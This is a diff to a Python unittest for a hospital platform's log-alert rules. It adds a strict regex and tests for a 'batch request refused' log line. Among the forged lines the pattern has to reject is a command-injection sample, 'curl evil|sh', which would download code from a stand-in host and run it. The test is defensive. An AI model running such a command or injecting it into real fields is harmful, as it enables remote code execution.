@@ -58,6 +58,11 @@ DB_ROLE_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker, p
 # app services only, a hospital-shaped schema and a fixed reason
 GATED_LINE = r"^ihr-db-role: gated schema=(?P<schema>h_[a-z0-9]{10}) reason=(?P<reason>controls|extra_privileges)$"
 GATED_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker"
+# A refused batch sub-request (deploy/logs/alerts/batch.yml, P1-T20a): our whole fixed line from
+# the web backend, a slug-shaped hospital, a reason code, a method and a URL name (no values)
+BATCH_LINE = (r"^ihr-batch: refused hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) "
+              r"reason=(?P<reason>not_listed|bad_url|bad_method|nested|override) "
+              r"method=(?P<method>GET|POST|PUT|PATCH|DELETE|other) route=(?P<route>[A-Za-z0-9_.:-]{1,100})$")
 # Postgres's own line for a failed login of one of our roles (known limit 1: a changed password)
 LOGIN_FAILED = r'FATAL: +password authentication failed for user "(?P<role>ihr_app|ihr_owner|ihr_audit_watch|ihr_dump)"$'
 STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
@@ -295,6 +300,14 @@ class LogAlerts(unittest.TestCase):
                                  + r"\) \"ihr-db-role: gated\" \| extract_regexp \"" + re.escape(GATED_LINE) + r"\" ")
                 allowed = r"^\$(labels\.schema|value)$"
                 self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "BatchRequestRefused":
+                self.assertEqual(by, ["hospital"], r["alert"])
+                # the web backend writes it (it runs the batch); our whole fixed line only
+                self.assertRegex(r["expr"], r'^_time:\d+[hm] source:=container service:in\(backend\) "ihr-batch: refused" '
+                                 r'\| extract_regexp "' + re.escape(BATCH_LINE) + r'" '
+                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
+                allowed = r"^\$(labels\.hospital|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
             elif r["alert"] == "DatabaseRoleLoginFailed":
                 self.assertEqual(by, ["role"], r["alert"])
                 # the db container's own lines only
@@ -309,7 +322,7 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.client_ip|value)$"
             for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                 self.assertRegex(ref.strip(), allowed, r["alert"])
-        self.assertEqual(sorted(names), ["DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
+        self.assertEqual(sorted(names), ["BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
                                          "FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
                                          "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
                                          "SignInLockoutsFromAddress"])
@@ -330,6 +343,27 @@ class LogAlerts(unittest.TestCase):
                        "ihr-packs: hospital=beta outcome=deferred",
                        "ihr-packs: hospital=fake outcome=failed\nmore"):
             self.assertIsNone(line.search(forged), forged)
+
+    def test_batch_line_is_ours_alone(self):
+        """P1-T20a: only the batch view's whole refusal line; never a request path, a longer
+        line or a value. The view writes exactly this line (batch.refusal_line)."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "BatchRequestRefused"]
+        self.assertEqual(rule["labels"]["severity"], "warning")
+        line = re.compile(BATCH_LINE)
+        ok = "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=users-list"
+        self.assertEqual(line.match(ok)["hospital"], "alpha")
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-batch: refused hospital=fake reason=not_listed method=GET route=x" 404 179',
+                       "Not Found: /ihr-batch: refused hospital=fake reason=not_listed method=GET route=x",
+                       "ihr-batch: refused hospital=x;curl evil|sh; reason=not_listed method=GET route=x",
+                       "ihr-batch: refused hospital=alpha reason=forged method=GET route=x",
+                       "ihr-batch: refused hospital=alpha reason=not_listed method=get route=x",
+                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=/api/v1/users/",
+                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=x (and more)",
+                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=x\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        code = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "batch.py").read_text()
+        self.assertIn('REFUSAL_PREFIX = "ihr-batch: refused"', code)
+        self.assertIn('f"{REFUSAL_PREFIX} hospital={slug} reason={reason} method={method} route={route}"', code)
 
     def test_fleet_line_is_ours_alone(self):
         """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
@@ -461,7 +495,8 @@ class LogAlerts(unittest.TestCase):
                                  "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
                                  "PackApplyFailed": None, "HospitalNotServed": None,
                                  "ReleaseWindowOverrun": None, "DatabaseRoleRefused": None,
-                                 "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None})
+                                 "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None,
+                                 "BatchRequestRefused": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
